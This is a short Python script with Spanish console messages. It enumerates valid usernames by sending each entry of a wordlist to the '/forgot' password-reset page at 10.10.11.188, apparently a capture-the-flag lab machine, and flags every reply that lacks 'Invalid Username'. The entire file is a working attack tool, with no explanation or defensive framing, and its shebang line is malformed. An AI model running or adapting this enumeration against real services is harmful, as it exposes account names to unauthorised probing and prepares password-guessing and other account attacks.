#/usr/bin/python3

import requests, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+c
signal.signal(signal.SIGINT, def_handler)

def find_users():
    wordlist = open(sys.argv[1], 'r')
    
    for line in wordlist:
        url = "http://10.10.11.188/forgot?username=%s" % line
        r = requests.get(url.strip())
        if "Invalid Username" not in r.text:
            print("[+] User found: %s" % line)


if __name__ == '__main__':
    if len(sys.argv) == 2:
        find_users()
    else:
        print("[!] User wordlist missing")
        sys.exit(1)
